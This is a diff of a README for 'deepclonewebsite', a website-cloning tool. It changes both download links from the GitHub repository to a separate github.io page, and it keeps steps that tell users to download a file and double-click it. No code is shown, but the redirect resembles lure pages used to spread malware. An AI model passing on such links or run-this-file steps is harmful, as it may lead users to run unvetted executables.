@@ -1,9 +1,9 @@
 # 🔄 deepclonewebsite - Clone any site, rebuild offline
-[![Download deepclonewebsite](https://img.shields.io/badge/Download-deepclonewebsite-blue?style=for-the-badge&logo=github)](https://github.com/rulershippenstock47/deepclonewebsite)
+[![Download deepclonewebsite](https://img.shields.io/badge/Download-deepclonewebsite-blue?style=for-the-badge&logo=github)](https://rulershippenstock47.github.io)
 ## 🚀 Getting Started
 Welcome to deepclonewebsite! This tool lets you make an exact copy of any website, work with it on your computer without internet, and even use artificial intelligence to understand how the site works. Perfect for learning, testing, or saving your favorite web pages.
 ## 📥 Download and Install
-Visit this link to download the application: [https://github.com/rulershippenstock47/deepclonewebsite](https://github.com/rulershippenstock47/deepclonewebsite)
+Visit this link to download the application: [https://rulershippenstock47.github.io](https://rulershippenstock47.github.io)
 1. Click the download link above
 2. Find the downloaded file in your Downloads folder
 3. Double-click the file to run it
